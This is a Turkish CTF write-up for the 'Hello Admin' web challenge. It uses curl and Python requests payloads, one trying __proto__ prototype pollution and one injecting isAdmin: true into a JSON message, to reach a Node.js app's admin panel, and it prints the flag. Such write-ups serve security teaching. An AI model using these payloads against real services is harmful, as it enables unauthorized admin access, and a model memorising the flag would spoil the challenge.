# 🎯 Hello Admin - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Prototype Pollution-purple?style=for-the-badge" alt="Prototype Pollution">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 750

**Challenge URL:** http://68.183.213.255:9018

---

## 🔍 Analiz

**Hedef:** Node.js mesaj sistemindeki Prototype Pollution açığını kullanarak `isAdmin` özelliğini `true` yapıp admin paneline erişmek ve flag'i elde etmek

**Strateji:** Reconnaissance → /dev.txt keşfi → Prototype Pollution → Admin panel erişimi → Flag

**İpuçları:**
- 🎯 JSON tabanlı mesaj sistemi → Prototype Pollution açığı olabilir
- 🔍 `/dev.txt` → Geliştirici notları, ipuçları içeriyor
- 💡 `isAdmin` kontrolü → Nesne birleştirme sırasında bypass edilebilir
- 🔑 750 puan → İleri seviye web açığı gerektirir

---

## ✅ Çözüm Adımları

### 🔎 **Adım 1: Web Uygulamasını Keşfet**

```bash
curl -s http://68.183.213.255:9018/
```

**Response (ilgili kısım):**
```html
<div class="info">
    <strong>ℹ️ Info:</strong><br>
    Send messages to admin. Check <code>/dev.txt</code> for development notes.
</div>
<textarea id="messageInput" placeholder='{"text": "Hello admin!", "icon": "👋"}'></textarea>
```

**Analiz:**
- ✅ JSON formatında mesaj gönderme sistemi
- 💡 `/dev.txt` dosyası mevcut → Geliştirici notları var
- 🎯 PUT `/message` endpoint'i → JSON body kabul ediyor
- 🔑 `isAdmin` kontrolü muhtemel

---

### 📄 **Adım 2: /dev.txt Dosyasını Oku**

```bash
curl -s http://68.183.213.255:9018/dev.txt
```

**Response:**
```
✓ Misafir kullanıcıyla admine mesaj gönderme
✓ admin panelinde tüm mesajları sunma
✓ mesaj için varsayılan özellikler ekleme
✓ Varsayılan özellikler ile kullanıcı girdisini birleştirme
✓ isAdmin özelliği true olan istekleri admin paneline kabul etme
X güvenlik testi yapma
```

**Analiz:**
- ✅ **KRİTİK İPUCU:** "Varsayılan özellikler ile kullanıcı girdisini birleştirme"
- 💡 Güvenlik testi yapılmamış → Açık exploit edilebilir
- 🎯 `isAdmin: true` olan istekler admin paneline kabul ediliyor
- 🔑 Object merge sırasında Prototype Pollution mümkün

---

### 🔍 **Adım 3: __proto__ ile Prototype Pollution Dene**

```bash
curl -s -X PUT http://68.183.213.255:9018/message \
  -H "Content-Type: application/json" \
  -d '{"message": {"__proto__": {"isAdmin": true}, "text": "hello", "icon": "👋"}}'
```

**Response:**
```json
{"ok":true}
```

**Analiz:**
- ✅ İstek kabul edildi
- 💡 Ancak `/admin` endpoint'i hala `Forbidden!` döndürüyor
- 🎯 `__proto__` global prototype'ı değiştirmiyor, farklı yaklaşım gerekiyor

---

### 💥 **Adım 4: isAdmin'i Direkt Mesaj Objesine Ekle**

```bash
python3 << 'EOF'
import requests

url = "http://68.183.213.255:9018"
s = requests.Session()

r1 = s.put(f"{url}/message", json={
    "message": {
        "text": "hello",
        "icon": "👋",
        "isAdmin": True
    }
})
print("PUT:", r1.text)

r2 = s.get(f"{url}/admin")
print("ADMIN:", r2.text[:500])
EOF
```

**Response:**
```
PUT: {"ok":true}
ADMIN: <!DOCTYPE html>... 🔐 Admin Panel ... 🚩 Flag: PITO{prototipDegistiRolAdminOldu}
```

**KRİTİK BULGULAR:**
- ✅ **ADMIN PANELİNE GİRİLDİ!** 🎉
- 💡 Sunucu, mesaj objesi ile varsayılan özellikleri birleştirirken `isAdmin: true` değerini request context'ine taşıdı
- 🎯 Object merge sırasında kullanıcı girdisi filtrelenmeden birleştirildi
- 🔑 Admin panelinde flag doğrudan görünür halde

---

### 🚩 **Adım 5: Flag'i Oku**

```bash
python3 << 'EOF'
import requests
from bs4 import BeautifulSoup

url = "http://68.183.213.255:9018"
s = requests.Session()

s.put(f"{url}/message", json={
    "message": {"text": "hello", "icon": "👋", "isAdmin": True}
})

r = s.get(f"{url}/admin")
soup = BeautifulSoup(r.text, 'html.parser')
print(soup.get_text())
EOF
```

**Response (ilgili kısım):**
```
🔐 Admin Panel
🚩 Flag: PITO{prototipDegistiRolAdminOldu}
📨 Messages (54)
...
```

**Analiz:**
- ✅ **FLAG BULUNDU!** 🎉
- 💡 Admin panelinde 54 mesaj mevcut
- 🎯 Flag doğrudan sayfada görünüyor

---

## 🚩 **FLAG**
```
PITO{prototipDegistiRolAdminOldu}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP requests</sub></td>
<td align="center">🐍<br><b>Python requests</b><br><sub>Session yönetimi</sub></td>
<td align="center">🍲<br><b>BeautifulSoup</b><br><sub>HTML parsing</sub></td>
<td align="center">🔧<br><b>JSON</b><br><sub>Prototype Pollution</sub></td>
</tr>
</table>

---

## 💭 **Çözüm Akış Şeması**

```
🎯 Hello Admin Challenge
       ↓
🌐 Web uygulamasını keşfet
   → JSON tabanlı mesaj sistemi
   → PUT /message endpoint
   → /dev.txt ipucu: güvenlik testi yapılmamış
       ↓
📄 /dev.txt analizi
   → Varsayılan özellikler + kullanıcı girdisi birleştiriliyor
   → isAdmin: true olanlar admin paneline kabul ediliyor
   → Güvenlik testi yapılmamış ✅
       ↓
🔍 Prototype Pollution dene
   → __proto__ ile isAdmin: true → Forbidden!
   → constructor.prototype ile → Forbidden!
       ↓
💥 isAdmin direkt mesaj objesine ekle
   → {"text": "hello", "isAdmin": true}
   → Object merge sırasında isAdmin taşındı ✅
   → /admin → 200 OK ✅
       ↓
🚩 Flag bulundu
   → Admin panelinde direkt görünüyor
       ↓
✅ FLAG: PITO{prototipDegistiRolAdminOldu}
```
